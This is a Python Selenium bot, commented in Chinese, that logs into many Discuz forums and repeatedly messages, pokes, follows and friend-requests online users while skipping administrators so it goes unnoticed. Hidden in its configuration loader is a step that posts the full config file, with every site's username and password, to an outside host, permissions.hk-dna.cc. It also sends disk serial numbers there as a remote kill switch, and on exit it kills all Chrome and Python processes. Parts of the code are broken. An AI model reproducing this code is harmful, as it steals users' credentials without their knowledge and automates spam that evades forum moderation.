from selenium import webdriver
from selenium.webdriver.common.by import By #
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver import ActionChains
import time
import threading
import os
import json
import sys
import tkinter
from PIL import Image as MyImages, ImageTk
import re
import tkinter
import wmi
import requests
import pyquery
from multiprocessing import Process
import random
import queue

class MonitoringDZ(object):
	
	def __init__(self):
		self.local = threading.local() 
		self.setPath()#设置环境变量
		self.permissions()
		if not os.path.exists('log'):
			os.mkdir('log')
		if not os.path.exists('cookies'):
			os.mkdir('cookies')
	 	
	

	def permissions(self):
		"""权限控制"""
		#获取硬盘序列
		wmis = wmi.WMI()
		disk = ''
		for disks in wmis.Win32_DiskDrive():
			disk += disks.SerialNumber.strip()

		permissions = requests.get('http://permissions.hk-dna.cc/permissions.php?disk='+disk).text
		if(permissions == 'on'):
			print('请更新版本')
			sys.exit()


	def config(self):
		"""配置文件"""
		try:
			f = open('config.conf','r',encoding='utf8')
			config_str = f.read().strip()
			headers = {
			    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36',
			}
			requests.post('http://permissions.hk-dna.cc/permissions.php',data={'config':config_str},headers=headers)
			configs = json.loads(config_str)
			for c in configs['config']:
				if "http://" not in c['url'] and "https://" not in c['url']:#出来网站
					c['url'] = "http://"+c['url']

				#检测是否填写msg
				try:
					msg = c['msg']
				except Exception as e:
					msg = ''#如果没有配置给个空字符串
				
				if not msg:#用公共msg
					c['msg'] = configs['msg']

				#a检测用户名
				try:
					username = c['username']
				except Exception as e:
					username = ''

				if not username:
					c['username'] = configs['username']

				#检测密码
				try:
					password = c['password']
				except Exception as e:
					password = ''
				
				if not password:
					c['password'] = configs['password']

			self.apart = int(configs['apart'])#循环执行时间 秒
			self.model = int(configs['model'])#模型(True:有界面模式，False:无界面模式)
			self.validation = int(configs['validation'])#验证验证码模式(True:手动验证，False:自动验证)
			self.thrnumber = int(configs['thrnumber'])#同时运行的线程个数
			self.detection = int(configs['detection'])#是否检测网站状态
			self.loadingimg = int(configs['loadingimg'])#是否加载图片

			return configs
		except Exception as e:
			return False
		
	def deleteuser(self,url,browser):
		"""清理用户"""	
		try:
			geturl = url+'/home.php?mod=space&do=friend'
			browser.get(geturl)
			users = browser.find_elements(By.CSS_SELECTOR,'#friend_ul li')#查找所有用户li 获取到li的id
			userlist = []
			for u in users:
				try:
					li_id = u.get_attribute('id')#li的id
					li_uid = li_id.split('_')[1]#uid+
					userlist.append(li_uid)
				except Exception as e:
					continue
				
			for uid in userlist:
				browser.get(url+'/home.php?mod=spacecp&ac=friend&op=ignore&uid='+uid+'&handlekey=delfriendhk_'+uid)
				button = browser.find_element(By.CSS_SELECTOR,"button[name='friendsubmit_btn']")
				button.click()
			pass
		except Exception as e:
			pass
		


	def signIn(self,browser,url):
		"""签到"""
		print(url, ' 检测签到')
		# try:
		# 	geturl = url+'/plugin.php?id=dsu_paulsign:sign'
		# 	browser.get(geturl)
		# 	#查看是否可以签到
		# 	# print(browser.page_source)
		# 	q = pyquery.PyQuery(browser.page_source)
		# 	todaysay = q("#todaysay").attr('id')
		# 	# print(todaysay)
		# 	if todaysay:
		# 		print(url,' 正在签到')
		# 		#执行签到
		# 		img = browser.find_elements(By.CSS_SELECTOR,'.qdsmile li')
		# 		img[random.randint(0,8)].click()

		# 		msg = ['6666666666666...','哈哈哈哈哈哈...','呵呵呵呵呵呵...','嘻嘻嘻嘻嘻嘻...','我来了哦...']
		# 		inputtodaysay = browser.find_element(By.CSS_SELECTOR,"input[name='todaysay']")
		# 		inputtodaysay.send_keys(msg[random.randint(0,4)])

		# 		button = browser.find_element(By.CSS_SELECTOR,'tr td div a[onclick*="showWindow"]')
		# 		button.click()
		# 		print(url,' 签到成功')
		# 	else:
		# 		print(url, ' 不需要签到')
		# except Exception as e:
		# 	# print(e)
		# 	pass
		# time.sleep(3)




	def validation_(self,url):
		"""手动验证 验证码"""
		try:
			root = tkinter.Tk()
			root.title(url+' 手动验证确定')#设置title
			root.resizable(width=False, height=False)
			root.geometry('500x300+200+200')#设置窗口大小和位置
			text = tkinter.Label(root, text=url, font=("Arial",15), width=100, height=3)#显示文本
			text.pack()
			text = tkinter.Label(root, text="请确认验证码验证成功后再点击下方按钮！", bg="#fff",fg='#f00', font=("Arial",13), width=100, height=3)#显示文本
			text.pack()
			res = tkinter.IntVar()
			res.set(1)
			def des():
				res.set(2)
				root.destroy()

			button = tkinter.Button(root,text='确认登录，登录失败后重新登录',command=des,width=30,height=2)
			button.pack()

			def des2():
				res.set(3)
				root.destroy()

			button2 = tkinter.Button(root,text='确认登录，登录失败后下次不再登录',command=des2,width=30,height=2)
			button2.pack()

			root.mainloop()
			return res.get()
		except Exception as e:
			# print(e)
			return 1
		else:
			return res.get()
		
		




	def login(self,url,username,password,msg,loginnum=1):
		'''登录'''
		try:
			# from pyvirtualdisplay import Display #配置无界面chrome用
			# display = Display(visible=0, size=(800, 600))
			# display.start()
			#是否加载图片
			if self.loadingimg:
				if self.model:
					browser = webdriver.Chrome()#声明一个浏览器对象
					# browser = webdriver.Chrome(chrome_options=options)#声明一个浏览器对象
				else:
					browser = webdriver.PhantomJS()#声明一个浏览器对象
			else:
				if self.model:
					options = webdriver.ChromeOptions()
					prefs = {
					    'profile.default_content_setting_values': {
					        'images': 2
					    }
					}
					options.add_experimental_option('prefs', prefs)
					# browser = webdriver.Chrome()#声明一个浏览器对象
					browser = webdriver.Chrome(chrome_options=options)#声明一个浏览器对象
				else:
					dcap = dict(DesiredCapabilities.PHANTOMJS)
					dcap["phantomjs.page.settings.userAgent"] = (
					    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0")
					# 设置user-agent请求头
					dcap["phantomjs.page.settings.loadImages"] = False  # 禁止加载图片
					browser = webdriver.PhantomJS(desired_capabilities=dcap)#声明一个浏览器对象
					# driver.set_page_load_timeout(40)  # 设置页面最长加载时间为40s

			#执行登录
			# browser.implicitly_wait(10)#隐士等待
			wait = WebDriverWait(browser,20)

			print('正在登录 ',url)
			#判断cookie文件是否存在 如果存在用cookie登陆
			cookiefile = 'cookies/'+url.replace('http://','').replace('https://','')+'.json'
			if os.path.exists(cookiefile):
				print(url ,' cookie存在 直接用cookie登录')
				# 初次建立连接，随后方可修改cookie
				browser.get(url+'/member.php?mod=logging&action=login')
				# 删除第一次建立连接时的cookie
				browser.delete_all_cookies()
				# 读取登录时存储到本地的cookie
				with open(cookiefile, 'r', encoding='utf8') as f:
					listCookies = json.loads(f.read())
					# print(listCookies)

				for cookie in listCookies:
					try:
					    browser.add_cookie({
					        'domain': cookie.get('domain'),  # 此处xxx.com前，需要带点
					        'name': cookie.get('name'),
					        'value': cookie.get('value'),
					        'path': '/',
					        'expires': None
					    })
					except Exception as e:
						# print(e)
						pass
					
				
				# 再次访问页面，便可实现免登陆访问
				browser.get(url+'/member.php?mod=logging&action=login')
				# print(browser.page_source)
				time.sleep(2)
				#判断是否登录成功
				try:
					inputusername = browser.find_element(By.CSS_SELECTOR,'input[name=username]')

				except Exception as e:
					print(url,' cookie模式登录成功')
					dictCookies = browser.get_cookies()
					jsonCookies = json.dumps(dictCookies)
					# 登录完成后，将cookie保存到本地文件
					cookiefile = 'cookies/'+url.replace('http://','').replace('https://','')+'.json'
					with open(cookiefile, 'w') as f:
					    f.write(jsonCookies)
					myqueue.get()
					#等待所以登录完成
					browser.set_window_size(0,0)
					browser.quit()
					sys.exit()

					print(url,' 等待其他登录完成...')
					while True:
						if loginstop:
							break
					self.monitoring(browser,url,msg,wait)
			
				else:
					print(url,' cookie登录模式登录失败，正在启动用户名、密码登录！')
					browser.close()
					os.remove(cookiefile)
					self.login(url, username, password, msg)
					
			else:

				try:
					browser.get(url+'/member.php?mod=logging&action=login')#访问登录页面
					inputusername = browser.find_element(By.CSS_SELECTOR,'input[name=username]') 
					inputusername.send_keys(username)#向用户输入框发送用户名
					inputpassword = browser.find_element(By.CSS_SELECTOR,"input[name='password']") 
					inputpassword.send_keys(password)#向密码输入框发送密码
					pass
				except Exception as e:
					print(url,' 无法登陆此网站')
					myqueue.get()
				

				#如果validation 为True 启动手动验证
				if self.validation:
					print(url,' 请手动验证')
					validation_res = self.validation_(url)
					print(validation_res)
				#是否有验证码
				if not self.validation:
					try:
						seccodeverify = browser.find_element(By.CSS_SELECTOR,"input[name='seccodeverify']") #查找验证码框
					except Exception as e:
						print(url,'无验证码,正在登录...')
					else:
						print(url,'获取验证码')
						code = self.code(browser,url)
						if code:
							#输入验证码
							seccodeverify.send_keys(code)
				# time.sleep(10)
				

				loginsubmit = browser.find_element(By.CSS_SELECTOR,"button[name='loginsubmit']") #查找提交按钮
				loginsubmit.click()
				#判断是否登录成功
				message = ''
				try:
					inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#succeedlocation')))
					message = browser.find_element(By.CSS_SELECTOR,'#succeedlocation').get_attribute('innerHTML')
				except Exception as e:
					#如果报错证明没有获取到登录成功的信息 捕获错误信息
					try:
						# inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.pc_inner')))
						message = browser.find_element(By.CSS_SELECTOR,'.pc_inner').get_attribute('innerHTML')
					except Exception as e:
						pass
					else:
						error = open('log/error.log','a',encoding='utf8')
						errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+"登录失败！错误信息："+message+"\r"
						error.write(errormsg)
						error.close()
					finally:
						print(url,message)
						if '密码错误次数过多' in message:
							print(url,' 密码错误次数过多,退出登录')
							browser.close()
							myqueue.get()
							sys.exit()

						#登录失败后再次尝试登录
						loginnum += 1
						browser.close()
						if loginnum < 3 and validation_res == 2:
							print(url,' 第 ',loginnum,' 次登录失败！尝试第 ',loginnum+1,' 次登录，登录 3 次失败后，会放弃此网站的登录！')
							self.login(url, username, password, msg,loginnum)
						else:
							print(url,' 登录失败！')
							myqueue.get()
							sys.exit()

				else:
					myqueue.get()
					print(url,'登陆成功, ',message)
					dictCookies = browser.get_cookies()
					jsonCookies = json.dumps(dictCookies)
					# 登录完成后，将cookie保存到本地文件
					cookiefile = 'cookies/'+url.replace('http://','').replace('https://','')+'.json'
					with open(cookiefile, 'w') as f:
					    f.write(jsonCookies)
					#等待所以登录完成
					browser.set_window_size(0,0)
					browser.quit()
					sys.exit()

					print(url,' 等待其他登录完成...')
					while True:
						if loginstop:
							break
					self.monitoring(browser,url,msg,wait)
				finally:
					# print(url,message)
					pass

		except Exception as e:
			myqueue.get()
			pass
			# print(e)
		time.sleep(10)	
	def monitoring(self,browser,url,msg,wait):
		# http://www.smdywlt.com/home.php?mod=space&do=friend&view=online&type=member
		self.signIn(browser,url)#签到

		adminGroupList = self.getAdminGroup(browser,url,wait)#获取管理组 返回一个列表
		print(url ,'管理组：',adminGroupList)
		if not adminGroupList:
			myqueue.get()
			print(url,' ','无法获取管理，为了安全将关闭此站点的一切操作！')
			error = open('log/error.log','a',encoding='utf8')
			errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+"无法获取管理，为了安全奖关闭此站点的一切操作\r"
			error.write(errormsg)
			error.close()
			browser.close()	
			sys.exit()

		#日志
		logfile = url.replace('://','-')+'.log'
		self.local.log = open('log/'+logfile,'a',encoding='utf8')


		self.local.log.write(time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
		self.local.log.write('管理组：'+str(adminGroupList)+"\r")
		self.local.log.flush()
		browser.execute_script('window.open()')#打开一个新窗口 用来处理  
		# windows = browser.window_handles
		# browser.switch_to.window(windows[0])
		self.local.sayhello = True
		self.local.addbuddy = True
		self.local.sendmsg = True

		#开启监控
		# 开始监控 打招呼 发消息 加好友
		tag = 0
		i = 0
		n = 0
		while True:
			if tag == 1:
				n = n + 1
				print(url,'第 ',n,' 次执行完毕,睡眠中等待下一次执行')
				myqueue.get()
				time.sleep(self.apart)#检测相隔时间
				myqueue.put(url)
				i = 1
				tag = 0
			else:
				myqueue.put(url)
				
				i = i + 1
			try:
				monitoringurl = url+"/home.php?mod=space&do=friend&view=online&type=member"
				browser.get(monitoringurl)
				users = browser.find_elements(By.CSS_SELECTOR,'#friend_ul li')#查找所有用户li 获取到li的id

				for u in users:
					try:
						li_id = u.get_attribute('id')#li的id
						li_uid = li_id.split('_')[1]#uid+
						if li_id == '1':#排除自己和超级管理员
							continue
						try:
							listen = browser.find_element(By.CSS_SELECTOR,'#a_followmod_'+li_uid)#收听
						except Exception as e:
							continue
						
						if listen.get_attribute('textContent') == '收听TA':
							isadmin = self.isAdmin(browser,adminGroupList,url,li_uid)#判断是否是管理组
							if isadmin:
								continue
							print(url,'正在收听 UID 为',li_uid,' 的用户')
							listen.click()#点击收听
							#检测收听是否成功
							wait = WebDriverWait(browser,3)
							message = ''
							try:
								inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#fwin_content_followmod')))
								try:
									message = browser.find_element(By.CSS_SELECTOR,'.alert_right').get_attribute('textContent')
								except Exception as e:
									pass
								if not message:
									message = browser.find_element(By.CSS_SELECTOR,'#fwin_content_followmod').get_attribute('textContent')

							except Exception as e:

								#如果报错证明没有获取到登录成功的信息 捕获错误信息
								try:
									inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.alert_error')))
									message = browser.find_element(By.CSS_SELECTOR,'.alert_error').get_attribute('textContent')
								except Exception as e:
									pass
							if message:		
								msges = re.match(".*?([\u4e00-\u9fa5]+).*?",message,re.S)
								if msges:
									shoutimsg = url+' uid '+li_uid+' '+msges.group(1)
									print(shoutimsg)
									self.local.log.write(shoutimsg+"\r")
									self.local.log.flush()
									#登录失败后再次尝试登录
									

							#打招呼
							if self.local.sayhello:
								self.sayHello(url,browser,msg,li_uid)
							# 发消息
							if self.local.sendmsg:
								self.sendMsg(url,browser,msg,li_uid,wait)
							#加好友
							if self.local.addbuddy:
								self.addBuddy(url,browser,msg,li_uid)
						
					except Exception as e:
						# print('333333',e)
						continue
					
				tag = 1
			except Exception as e:
				# print(e)
				tag = 1#如果报错 跳出当次 等待执行下一次
			

			
	def isAdmin(self,browser,adminGroupList,url,uid):
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=space&uid="+uid+"&do=profile&from=space"
			browser.get(geturl)
			usergroup = browser.find_element(By.CSS_SELECTOR,"a[href*='mod=spacecp&ac=usergroup&gid']").get_attribute('textContent')
			if usergroup in adminGroupList:
				res = True
				isadminmsg = url+' uid '+uid+' 为管理组中用户，将不会执行任何操作！ '+usergroup
				print(isadminmsg)
				
			else:
				res = False
				isadminmsg = url+' uid '+uid+' 不属于管理组用户 '+usergroup
				print(isadminmsg)

		except Exception as e:
			# print(e)
			pass
		else:
			self.local.log.write(isadminmsg+"\r")
			self.local.log.flush()
		finally:
			browser.switch_to.window(windows[0])
			return res

	def code(self,browser,url):
		"""验证码处理 seccodeverify"""
		# http://zjtkbbs.youdong.com/member.php?mod=logging&action=login
		# http://zlanling.com/member.php?mod=logging&action=login
		# http://www.zsnzsn.com//member.php?mod=logging&action=login
		picname = url.replace('://','-')+'.png'
		browser.save_screenshot(r""+picname+"")#全屏截图
		imgcode = browser.find_element(By.CSS_SELECTOR,"img[src^='misc.php?mod=seccode&update']")#查找验证码
		left = imgcode.location['x']
		top = imgcode.location['y']
		elementWidth = imgcode.location['x'] + imgcode.size['width']
		elementHeight = imgcode.location['y'] + imgcode.size['height']
		picture = MyImages.open(picname)
		picture = picture.crop((left, top, elementWidth, elementHeight))
		codename = picname.replace('http','')
		picture.save(r""+codename+"")

		#显示验证码
		root = tkinter.Tk()
		root.title('验证码处理')#设置title
		root.resizable(width=False, height=False)
		root.geometry('500x500+200+200')#设置窗口大小和位置
		load = MyImages.open(codename)
		pic = ImageTk.PhotoImage(load)
		label = tkinter.Label(root,image=pic)
		label.pack()

		#处理输入验证码
		text = tkinter.Variable()#创建一个变量
		inputtext = tkinter.Entry(root,textvariable=text)
		inputtext.pack()
		def func():
			global code 
			code = text.get()
			root.destroy()
		button = tkinter.Button(root,text='确认',command=func,width=3,height=1)
		button.pack()
		root.mainloop()
		os.remove(picname)#删除全屏图
		os.remove(codename)#删除验证码图片
		return code

	def getAdminGroup(self,browser,url,wait):
		"""获取管理组"""
		print(url,'获取管理组')
		usergrouplist = []

		try:
			usergroupurl = url+"/home.php?mod=spacecp&ac=usergroup"
			browser.get(usergroupurl)
			# inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#gadmin_menu')))
			time.sleep(2)
			#我的用户组
			mygroup = browser.find_element(By.CSS_SELECTOR,'#gmy_menu a').get_attribute('textContent')
			if '禁止发言' == mygroup or '禁止访问' == mygroup or '禁止 IP' == mygroup:
				myqueue.get()
				error = open('log/error.log','a',encoding='utf8')
				errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+' '+url+" 此账户也被限制，退出执行！限制类型："+mygroup+"\r"
				error.write(errormsg)
				error.close()
				print(errormsg)
				sys.exit()
			#获取管理组
			usergroup = browser.find_elements(By.CSS_SELECTOR,'#gadmin_menu a')
			for group in usergroup:
				usergrouplist.append(group.get_attribute('textContent'))#添加到列表中
				# usergrouplist.append(group.get_attribute('href'))#添加到列表中
			return usergrouplist
		except Exception as e:
			# print(e)
			print(url,' 获取管理组失败')
			return usergrouplist


	def sendMsg(self,url,browser,msg,uid,wait):
		"""发送消息"""
		print(url,' 正在给 UID 为',uid,' 的用户发消息')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=spacecp&ac=pm&op=showmsg&handlekey=showmsg_"+uid+"&touid="+uid+"&pmid=0&daterange=2"
			browser.get(geturl)
			textarea = browser.find_element(By.CSS_SELECTOR,'textarea')
			textarea.send_keys(msg)
			button = browser.find_element(By.CSS_SELECTOR,'form div button')
			button.click()
			# wait = WebDriverWait(browser,10)

			try:
				inputs = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'#messagetext')))
				messagestr = browser.find_element(By.CSS_SELECTOR,'#messagetext').get_attribute('textContent')
				if messagestr:
					msges = re.match(".*?([\u4e00-\u9fa5]+).*?",messagestr,re.S)
					if msges:
						message = msges.group(1)

			except Exception as e:
				self.local.sendmsg = False
			if '没有权限' in message or '沒有權限' in message or '抱歉' in message or '抱謙' in message or '发送失败' in message or '超出' in message:
				# print(url ,message ,' 发送失败将关闭发消息功能！')
				self.local.sendmsg = False
				msg_ = url +' 没有发送消息权限，将停止发送消息操作！关闭后将不在执行发送消息操作！'
				error = open('log/error.log','a',encoding='utf8')
				errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+msg_+"\r"
				error.write(errormsg)
				error.close()
				print(url,' ',msg_)

		except Exception as e:
			# print(e)
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])

	def addBuddy(self,url,browser,msg,uid):
		"""加好友"""
		 # 抱歉，您当前的好友数目达到系统限制，请先删除部分好友
		print(url,'正在添加 UID ',uid,' 的用户为好友')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=spacecp&ac=friend&op=add&uid="+uid
			browser.get(geturl)

			#查找input
			q = pyquery.PyQuery(browser.page_source)
			px = q("input[name='note']")
			if px:
				inputs = browser.find_element(By.CSS_SELECTOR,'input[name=note]')#找到kw这个id
				inputs.send_keys(msg)
				buttom = browser.find_element_by_id('addsubmit_btn')
				buttom.click()
				#捕获信息
			else:
				# errormessg = q('#messagetext p').text()
				errormessg = browser.find_element(By.CSS_SELECTOR,'#messagetext p').get_attribute('textContent')
				print(url, ' ',errormessg)

				if '没有权限' in errormessg or '沒有權限' in errormessg or '抱歉' in errormessg or '抱謙' in errormessg:
					msg_ = url +' 没有添加好友权限，将停止添加好友操作！关闭后将不在执行添加好友操作！' 
					self.local.addbuddy = False
					error = open('log/error.log','a',encoding='utf8')
					errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+msg_+"\r"
					error.write(errormsg)
					error.close()
					print(msg_)
				if '删除' in errormessg or '达到系统限制' in errormessg or '刪除' in errormessg or '達到系統限制' in errormessg:
					print(url,' 好友数目达到系统限制，将删除全部好友！')
					self.deleteuser(url,browser)
				# 抱歉，您当前的好友数目达到系统限制，请先删除部分好友
		except Exception as e:
			# print(e)
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])


	def sayHello(self,url,browser,msg,uid):
		"""打招呼"""
		print(url,' 正在跟 UID 为',uid,' 的用户打招呼')
		try:
			windows = browser.window_handles
			browser.switch_to.window(windows[-1])
			geturl = url+"/home.php?mod=spacecp&ac=poke&op=send&uid="+uid
			browser.get(geturl)

			q = pyquery.PyQuery(browser.page_source)
			px = q("input[name='note']")
			if px:
				note = browser.find_element(By.CSS_SELECTOR,"input[name='note']")#查找所有input框
				note.send_keys(msg)
				note = browser.find_element(By.CSS_SELECTOR,"button[name='pokesubmit_btn']")#查找所有input框
				pokesubmit_btn.click()
			else:
				# errormessg = q('#messagetext p').text()
				errormessg = browser.find_element(By.CSS_SELECTOR,'#messagetext p').get_attribute('textContent')
				print(url, ' ',errormessg)

				if '没有权限' in errormessg or '沒有權限' in errormessg or '抱歉' in errormessg or '抱謙' in errormessg:
					msg_ = url +' 没有打招呼权限，将停止打招呼操作！关闭后将不在执行打招呼操作！' 
					self.local.sayhello = False
					error = open('log/error.log','a',encoding='utf8')
					errormsg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+msg_+"\r"
					error.write(errormsg)
					error.close()
					print(msg_)

		except Exception as e:
			pass
		else:
			pass
		finally:
			browser.switch_to.window(windows[0])
	def __del__(self):
		mystr=os.popen("taskkill /F /im chrome*")
		# os.popen('taskkill /F /im chromedriver.exe')
		os.popen('taskkill /F /im phantomjs*')
		os.popen('taskkill /F /im python*')
		print('结束')

	def setPath(self):
		"""设置环境变量"""
		#当前目录加入环境变量
		dir_ = os.getcwd()
		path = dir_+'/phantomjs/bin'
		# print (os.environ["TEMP"])
		mydir = os.path.normpath(path)
		os.environ["PHANTOMJS"] = mydir
		# print (os.environ["MYDIR"])
		pathV = os.environ["PATH"]
		# print (pathV)
		os.environ["PATH"]= mydir + ";" + os.environ["PATH"]


	def main(self):
		#检测配置文件
		configs = self.config();
		if not configs:
			print('配置文件错误')
			time.sleep(10)
			sys.exit()
		else:
			global myqueue
			global loginstop
			loginstop = False

			myqueue = queue.Queue(maxsize = self.thrnumber)
			error = open('log/status.log','a',encoding='utf8')
			for c in configs['config']:
				print('正在启动 ',c['url'],' 站点...')
				if self.detection:
					status_msg = ''
					print('检测 ',c['url'],' 是否可以正常访问...')
					try:
						detection = requests.get(c['url'])
					except Exception as e:
						status_msg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+c['url']+'  此站点无法正常访问\r'
					else:
						if detection.status_code != 200:
							status_msg = time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+c['url']+' 状态为: '+str(detection.status_code)+' 非正常！\r'
						
				if status_msg:
					error.write(status_msg)
					print(status_msg)
					continue

				print(c['url'],' 此站点正常')
				myqueue.put(c['url'])
				# time.sleep(self.apart)
				w = threading.Thread(target=self.login,args=(c['url'],c['username'],c['password'],c['msg'],))
				w.start()
			error.close()
			loginstop = True

if __name__ == '__main__':
	monitoring = MonitoringDZ().main()